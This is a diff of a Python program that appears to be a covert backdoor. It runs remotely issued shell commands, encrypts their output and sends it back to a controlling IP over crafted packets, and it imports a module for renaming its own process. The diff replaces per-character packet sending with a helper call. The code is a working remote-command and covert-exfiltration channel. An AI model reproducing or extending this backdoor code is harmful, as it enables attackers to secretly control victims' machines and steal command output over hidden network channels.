@@ -1,8 +1,6 @@
 #!/usr/bin/python
 
 import logging, setproctitle, triplesec, encryption, configfile, helpers
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import *
 from ctypes import cdll, byref, create_string_buffer
 
 state = 0
@@ -56,13 +54,10 @@ def shellCommand(packet, command):
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output = configfile.password + output.stdout.read() + output.stderr.read()
     encryptedData = encryption.encrypt(output, configfile.password)
-    lastIndex = len(encryptedData) - 1
-    for index, char in enumerate(encryptedData):
-        packet = helpers.createPacket(configfile.protocol, ip, char)
-        if index == lastIndex:
-            packet = packet/Raw(load=configfile.password)
-        send(packet, verbose=0)
-        time.sleep(0.1)
+    helpers.sendMessage(encryptedData
+                       , configfile.password
+                       , configfile.protocol
+                       , ip)
 
 def watchAdd():
     print "watchAdd"
